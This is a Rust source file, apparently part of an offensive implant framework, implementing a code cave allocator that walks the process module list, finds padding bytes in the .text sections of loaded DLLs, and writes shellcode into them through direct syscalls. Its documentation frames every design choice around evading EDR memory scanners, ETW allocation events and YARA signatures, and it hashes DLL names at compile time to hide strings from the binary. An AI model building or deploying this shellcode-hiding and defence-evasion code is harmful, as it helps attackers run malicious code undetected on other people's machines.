//! Code cave allocator — finds padding bytes in `.text` sections of loaded DLLs.
//!
//! # Why Code Caves?
//!
//! Traditional injection allocates new executable memory (`VirtualAlloc`,
//! `NtAllocateVirtualMemory`), which is one of the most heavily monitored
//! events by EDR solutions:
//!
//! - Memory scanners flag unbacked executable pages (no file on disk)
//! - ETW `MEM_ALLOC` events with `PAGE_EXECUTE_*` are high-severity
//! - YARA/signature scans target `RWX` regions specifically
//!
//! Code caves reuse padding bytes (`0xCC` int3, `0x00` null, `0x90` NOP)
//! that compilers and linkers leave at the end of `.text` sections in
//! legitimately loaded DLLs. The memory is already backed by a real file
//! on disk, appears in the module's VAD, and has legitimate protection
//! (`PAGE_EXECUTE_READ`).
//!
//! # OPSEC Properties
//!
//! - **No new executable allocations** — never calls `VirtualAlloc`,
//!   `VirtualAllocEx`, or `NtAllocateVirtualMemory` with execute permissions
//! - **Disk-backed memory** — pages are mapped from the DLL file on disk
//! - **Legitimate protections** — `PAGE_EXECUTE_READ`, not `RWX`
//! - **No new VAD entries** — reuses existing allocation descriptors
//! - **Temporary write access** — uses `NtProtectVirtualMemory` to briefly
//!   change to `PAGE_READWRITE`, write shellcode, then restore to original
//!
//! # Cave Selection Strategy
//!
//! 1. Walk the PEB `InLoadOrderModuleList` to enumerate loaded modules
//! 2. For each candidate DLL, parse PE headers to find `.text` section
//! 3. Scan `.text` section tail for runs of padding bytes (`0xCC`, `0x00`, `0x90`)
//! 4. Verify the page is `PAGE_EXECUTE_READ` or `PAGE_EXECUTE_READWRITE`
//! 5. Exclude critical DLLs (ntdll, kernel32, kernelbase) from cave candidates
//!
//! # Safety
//!
//! All functions are `unsafe` because they dereference raw pointers into
//! remote process memory and manipulate memory protections.

#![cfg(all(windows, target_arch = "x86_64"))]

use std::sync::OnceLock;

// ─── Local Windows ABI type definitions ────────────────────────────────────

type PVOID = *mut std::ffi::c_void;
type HANDLE = PVOID;
type DWORD = u32;
type SIZE_T = usize;
type NTSTATUS = i32;
type ULONG = u32;

const STATUS_SUCCESS: NTSTATUS = 0;
const PAGE_READWRITE: ULONG = 0x04;
const CURRENT_PROCESS: HANDLE = (-1isize) as *mut _;

// ─── Const Hash Functions ─────────────────────────────────────────────────
//
// Const-compatible versions of pe_resolve::hash_str / hash_wstr so that
// hash values can be computed at compile time, avoiding any plaintext
// DLL/function name strings in the binary.

const fn const_hash_str(bytes: &[u8]) -> u32 {
    let mut hash: u32 = pe_resolve::SEED;
    let mut i = 0;
    while i < bytes.len() {
        let b = bytes[i];
        if b == 0 {
            break;
        }
        let lower = if b >= b'A' && b <= b'Z' { b + 32 } else { b };
        hash = hash.rotate_right(13) ^ (lower as u32);
        i += 1;
    }
    hash
}

const fn const_hash_wstr(units: &[u16]) -> u32 {
    let mut hash: u32 = pe_resolve::SEED;
    let mut i = 0;
    while i < units.len() {
        let c = units[i];
        if c == 0 {
            break;
        }
        let lo = c as u8;
        let lo = if lo >= b'A' && lo <= b'Z' {
            lo + 32
        } else {
            lo
        };
        let hi = (c >> 8) as u8;
        let hi = if hi >= b'A' && hi <= b'Z' {
            hi + 32
        } else {
            hi
        };
        hash = hash.rotate_right(13) ^ (lo as u32);
        hash = hash.rotate_right(13) ^ (hi as u32);
        i += 1;
    }
    hash
}

// ─── Pre-computed hashes for excluded DLLs ──────────────────────────────────

const NTDLL_HASH: u32 = const_hash_wstr(&[
    b'n' as u16, b't' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
    b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
]);
const KERNEL32_HASH: u32 = const_hash_wstr(&[
    b'k' as u16, b'e' as u16, b'r' as u16, b'n' as u16, b'e' as u16,
    b'l' as u16, b'3' as u16, b'2' as u16, b'.' as u16, b'd' as u16,
    b'l' as u16, b'l' as u16,
]);
const KERNELBASE_HASH: u32 = const_hash_wstr(&[
    b'k' as u16, b'e' as u16, b'r' as u16, b'n' as u16, b'e' as u16,
    b'l' as u16, b'b' as u16, b'a' as u16, b's' as u16, b'e' as u16,
    b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
]);

// ─── Code Cave Allocator ──────────────────────────────────────────────────

/// Tracks an allocated code cave: its address, size, and the DLL module it
/// resides within. Used for cleanup via `free_cave`.
#[derive(Debug)]
pub struct CodeCave {
    /// Address of the code cave within the DLL's `.text` section.
    pub address: *mut std::ffi::c_void,
    /// Size of the code cave in bytes.
    pub size: usize,
    /// Original memory protection before we changed it to RW for writing.
    pub original_protection: u32,
}

/// Code cave allocator that scans loaded DLLs for usable padding regions.
///
/// # Usage
///
/// ```ignore
/// let allocator = CodeCaveAllocator::new();
/// let cave = allocator.allocate_cave(256)?;
/// allocator.write_to_cave(&cave, shellcode)?;
/// // ... execute shellcode via callback hijack ...
/// allocator.free_cave(&cave)?; // optional: zero out and restore protection
/// ```
pub struct CodeCaveAllocator {
    /// Cached list of loaded DLL base addresses and their `.text` section metadata.
    /// Populated on first call to `allocate_cave`.
    modules: OnceLock<Vec<ModuleInfo>>,
}

/// Metadata for a loaded DLL module, used during cave scanning.
struct ModuleInfo {
    /// Base address of the DLL in memory.
    base: *mut std::ffi::c_void,
    /// Size of the DLL image in memory.
    image_size: usize,
    /// `.text` section virtual address (relative to base).
    text_section_rva: usize,
    /// `.text` section virtual size.
    text_section_size: usize,
}

impl CodeCaveAllocator {
    /// Create a new code cave allocator.
    pub const fn new() -> Self {
        Self {
            modules: OnceLock::new(),
        }
    }

    /// Allocate a code cave of at least `required_bytes` in size.
    ///
    /// Scans loaded DLLs for padding regions in `.text` sections. Returns
    /// a `CodeCave` struct with the cave address, size, and original
    /// memory protection.
    ///
    /// # Safety
    ///
    /// Caller must ensure no other thread is writing to the cave region
    /// concurrently. The cave memory is briefly changed to `PAGE_READWRITE`
    /// during this call, then restored to its original protection.
    pub unsafe fn allocate_cave(&self, required_bytes: usize) -> Result<CodeCave, &'static str> {
        let modules = self.modules.get_or_init(|| unsafe { enumerate_modules() });

        for module in modules {
            if let Some(cave) = unsafe { find_cave_in_module(module, required_bytes) } {
                return Ok(cave);
            }
        }

        Err("no suitable code cave found in any loaded DLL")
    }

    /// Write shellcode into a previously allocated code cave.
    ///
    /// Temporarily changes the page protection to `PAGE_READWRITE`, writes
    /// the code, then restores the original protection. Flushes the
    /// instruction cache after writing.
    ///
    /// # Safety
    ///
    /// Caller must ensure `cave.size >= code.len()`.
    pub unsafe fn write_to_cave(&self, cave: &CodeCave, code: &[u8]) -> Result<(), &'static str> {
        if code.len() > cave.size {
            return Err("code too large for cave");
        }

        // Change protection to RW for writing.
        let mut base = cave.address as usize;
        let mut region_size = cave.size;
        let mut old_prot: u32 = 0;
        let status = crate::syscall!(
            "NtProtectVirtualMemory",
            CURRENT_PROCESS as u64,
            &mut base as *mut _ as u64,
            &mut region_size as *mut _ as u64,
            PAGE_READWRITE as u64,
            &mut old_prot as *mut _ as u64,
        );
        if status.is_err() || status.unwrap() < 0 {
            return Err("NtProtectVirtualMemory to RW failed");
        }

        // Write the code.
        std::ptr::copy_nonoverlapping(code.as_ptr(), cave.address as *mut u8, code.len());

        // Flush the instruction cache.
        crate::syscall!(
            "NtFlushInstructionCache",
            CURRENT_PROCESS as u64,
            cave.address as u64,
            code.len() as u64,
        )
        .ok();

        // Restore original protection.
        let mut base2 = cave.address as usize;
        let mut region_size2 = cave.size;
        let mut old_prot2: u32 = 0;
        let status = crate::syscall!(
            "NtProtectVirtualMemory",
            CURRENT_PROCESS as u64,
            &mut base2 as *mut _ as u64,
            &mut region_size2 as *mut _ as u64,
            cave.original_protection as u64,
            &mut old_prot2 as *mut _ as u64,
        );
        if status.is_err() || status.unwrap() < 0 {
            return Err("NtProtectVirtualMemory restore failed");
        }

        Ok(())
    }

    /// Zero out a code cave and restore its original protection.
    ///
    /// This is optional — if the agent is exiting or the cave will be reused,
    /// there is no need to call this. It is provided for operational hygiene
    /// when you want to clean up after execution.
    ///
    /// # Safety
    ///
    /// Caller must ensure `cave` points to a valid previously allocated cave.
    pub unsafe fn free_cave(&self, cave: &CodeCave) -> Result<(), &'static str> {
        // Change protection to RW.
        let mut base = cave.address as usize;
        let mut region_size = cave.size;
        let mut old_prot: u32 = 0;
        let status = crate::syscall!(
            "NtProtectVirtualMemory",
            CURRENT_PROCESS as u64,
            &mut base as *mut _ as u64,
            &mut region_size as *mut _ as u64,
            PAGE_READWRITE as u64,
            &mut old_prot as *mut _ as u64,
        );
        if status.is_err() || status.unwrap() < 0 {
            return Err("NtProtectVirtualMemory to RW failed during free");
        }

        // Zero out the cave.
        std::ptr::write_bytes(cave.address as *mut u8, 0xCC, cave.size);

        // Restore original protection.
        let mut base2 = cave.address as usize;
        let mut region_size2 = cave.size;
        let mut old_prot2: u32 = 0;
        let status = crate::syscall!(
            "NtProtectVirtualMemory",
            CURRENT_PROCESS as u64,
            &mut base2 as *mut _ as u64,
            &mut region_size2 as *mut _ as u64,
            cave.original_protection as u64,
            &mut old_prot2 as *mut _ as u64,
        );
        if status.is_err() || status.unwrap() < 0 {
            return Err("NtProtectVirtualMemory restore failed during free");
        }

        Ok(())
    }
}

// ─── Module Enumeration ───────────────────────────────────────────────────

/// Walk the PEB InLoadOrderModuleList and collect module info for cave scanning.
///
/// Excludes critical system DLLs (ntdll, kernel32, kernelbase) from candidates.
unsafe fn enumerate_modules() -> Vec<ModuleInfo> {
    let mut result = Vec::new();

    // Get PEB via TEB.
    let peb: *const u8;
    std::arch::asm!(
        "mov {}, gs:[0x60]",
        out(reg) peb,
        options(nostack, nomem, preserves_flags)
    );

    if peb.is_null() {
        return result;
    }

    // PEB->Ldr is at offset 0x18.
    let ldr = *(peb.add(0x18) as *const *const u8);
    if ldr.is_null() {
        return result;
    }

    // PEB_LDR_DATA->InLoadOrderModuleList is at offset 0x10.
    // The list head Flink is the first entry.
    let list_head = ldr.add(0x10) as *const *const u8;
    let first_entry = *list_head;
    if first_entry.is_null() {
        return result;
    }

    let mut current = first_entry;
    loop {
        // LDR_DATA_TABLE_ENTRY:
        //   +0x00 InLoadOrderLinks (LIST_ENTRY: Flink, Blink)
        //   +0x10 InMemoryOrderLinks
        //   +0x20 InInitializationOrderLinks
        //   +0x30 DllBase
        //   +0x38 EntryPoint
        //   +0x40 SizeOfImage
        //   +0x48 FullDllName (UNICODE_STRING: Length, MaxLength, Buffer)
        //   +0x58 BaseDllName (UNICODE_STRING)
        let dll_base = *(current.add(0x30) as *const *mut std::ffi::c_void);
        let size_of_image = *(current.add(0x40) as *const u32) as usize;

        // BaseDllName is at offset 0x58: UNICODE_STRING { Len(2), MaxLen(2), Buffer(8) }
        let name_len = *(current.add(0x58) as *const u16) as usize;
        let name_buffer = *(current.add(0x60) as *const *const u16);

        if !dll_base.is_null() && size_of_image > 0 && !name_buffer.is_null() && name_len > 0 {
            // Compute hash of module name.
            let name_slice = std::slice::from_raw_parts(name_buffer, name_len / 2);
            let name_hash = pe_resolve::hash_wstr(name_slice);

            // Skip critical DLLs.
            if name_hash != NTDLL_HASH
                && name_hash != KERNEL32_HASH
                && name_hash != KERNELBASE_HASH
            {
                if let Some(text_info) = find_text_section(dll_base, size_of_image) {
                    result.push(ModuleInfo {
                        base: dll_base,
                        image_size: size_of_image,
                        text_section_rva: text_info.0,
                        text_section_size: text_info.1,
                    });
                }
            }
        }

        // Advance to next entry.
        current = *current as *const u8;
        if current.is_null() || current == first_entry {
            break;
        }
    }

    result
}

/// Parse PE headers to find the `.text` section RVA and size.
///
/// Returns `Some((rva, virtual_size))` if a `.text` section is found.
unsafe fn find_text_section(base: *mut std::ffi::c_void, image_size: usize) -> Option<(usize, usize)> {
    let base_ptr = base as *const u8;

    // Check DOS signature "MZ".
    if *base_ptr != b'M' || *base_ptr.add(1) != b'Z' {
        return None;
    }

    // e_lfanew at offset 0x3C.
    let e_lfanew = u32::from_le_bytes([
        *base_ptr.add(0x3c),
        *base_ptr.add(0x3d),
        *base_ptr.add(0x3e),
        *base_ptr.add(0x3f),
    ]) as usize;

    // Check PE signature "PE\0\0".
    let pe_sig = base_ptr.add(e_lfanew);
    if e_lfanew + 4 > image_size {
        return None;
    }
    if *pe_sig != b'P' || *pe_sig.add(1) != b'E' {
        return None;
    }

    // COFF header starts at e_lfanew + 4.
    //   NumberOfSections at +2 (2 bytes)
    //   SizeOfOptionalHeader at +16 (2 bytes)
    let num_sections = u16::from_le_bytes([
        *pe_sig.add(6),
        *pe_sig.add(7),
    ]);
    let size_of_optional = u16::from_le_bytes([
        *pe_sig.add(20),
        *pe_sig.add(21),
    ]) as usize;

    // Section headers start after the optional header.
    let section_start = e_lfanew + 4 + 20 + size_of_optional;

    for i in 0..num_sections as usize {
        let sec_off = section_start + i * 40; // Each IMAGE_SECTION_HEADER is 40 bytes
        if sec_off + 40 > image_size {
            break;
        }

        let sec = base_ptr.add(sec_off);

        // Section name is first 8 bytes. Check for ".text\0\0\0".
        let name = &*std::ptr::slice_from_raw_parts(sec, 8);
        if name[..6] == *b".text\0" {
            // VirtualAddress at +12 (4 bytes), VirtualSize at +8 (4 bytes).
            let virtual_size = u32::from_le_bytes([
                *sec.add(8),
                *sec.add(9),
                *sec.add(10),
                *sec.add(11),
            ]) as usize;
            let virtual_address = u32::from_le_bytes([
                *sec.add(12),
                *sec.add(13),
                *sec.add(14),
                *sec.add(15),
            ]) as usize;

            return Some((virtual_address, virtual_size));
        }
    }

    None
}

/// Scan a module's `.text` section for a cave of at least `required_bytes`.
///
/// Looks for runs of padding bytes (0xCC, 0x00, 0x90) at the end of the
/// `.text` section. Verifies the memory protection is `PAGE_EXECUTE_READ` or
/// `PAGE_EXECUTE_READWRITE` before returning.
unsafe fn find_cave_in_module(module: &ModuleInfo, required_bytes: usize) -> Option<CodeCave> {
    let text_start = (module.base as usize) + module.text_section_rva;
    let text_end = text_start + module.text_section_size;

    if text_end <= text_start || required_bytes > module.text_section_size {
        return None;
    }

    let base_ptr = text_start as *const u8;

    // Scan backwards from end of .text section for padding bytes.
    // We look for a contiguous run of at least `required_bytes` padding.
    let mut run_start = text_end;
    let mut current = text_end;

    while current > text_start {
        current -= 1;
        let byte = *base_ptr.add(current - text_start);
        if byte == 0xCC || byte == 0x00 || byte == 0x90 {
            // Continue extending the run backwards.
        } else {
            // End of padding run. Check if the run is large enough.
            if run_start - (current + 1) >= required_bytes {
                let cave_addr = (current + 1) as *mut std::ffi::c_void;
                let cave_size = run_start - (current + 1);

                // Verify memory protection.
                if let Some(prot) = query_protection(cave_addr) {
                    // PAGE_EXECUTE_READ = 0x20, PAGE_EXECUTE_READWRITE = 0x40
                    if prot == 0x20 || prot == 0x40 {
                        return Some(CodeCave {
                            address: cave_addr,
                            size: cave_size,
                            original_protection: prot,
                        });
                    }
                }
            }
            // Reset for next run.
            run_start = current;
        }
    }

    // Check the first run at the very beginning.
    if run_start - text_start >= required_bytes {
        let cave_addr = text_start as *mut std::ffi::c_void;
        let cave_size = run_start - text_start;

        if let Some(prot) = query_protection(cave_addr) {
            if prot == 0x20 || prot == 0x40 {
                return Some(CodeCave {
                    address: cave_addr,
                    size: cave_size,
                    original_protection: prot,
                });
            }
        }
    }

    None
}

/// Query the memory protection of a page using VirtualQuery-style approach.
///
/// Uses `NtQueryVirtualMemory` (MemoryBasicInformation class) to get the
/// current protection of the page containing `addr`.
unsafe fn query_protection(addr: *mut std::ffi::c_void) -> Option<u32> {
    // MEMORY_BASIC_INFORMATION layout (x64):
    //   +0x00 BaseAddress        (8 bytes)
    //   +0x08 AllocationBase     (8 bytes)
    //   +0x10 AllocationProtect  (4 bytes)
    //   +0x14 PartitionId        (2 bytes)
    //   +0x18 RegionSize         (8 bytes)
    //   +0x20 State              (4 bytes)
    //   +0x24 Protect            (4 bytes)
    //   +0x28 Type               (4 bytes)
    // Total size: 48 bytes
    let mut mbi = [0u8; 48];

    let status = crate::syscall!(
        "NtQueryVirtualMemory",
        CURRENT_PROCESS as u64,             // ProcessHandle
        addr as u64,                         // BaseAddress
        0u64,                                // MemoryInformationClass (MemoryBasicInformation)
        mbi.as_mut_ptr() as u64,             // MemoryInformation
        mbi.len() as u64,                    // MemoryInformationLength
        std::ptr::null_mut::<u64>() as u64,  // ReturnLength
    );

    match status {
        Ok(s) if s >= 0 => {
            // Protect is at offset 0x24 (4 bytes).
            let protect = u32::from_le_bytes([
                mbi[0x24], mbi[0x25], mbi[0x26], mbi[0x27],
            ]);
            Some(protect)
        }
        _ => None,
    }
}
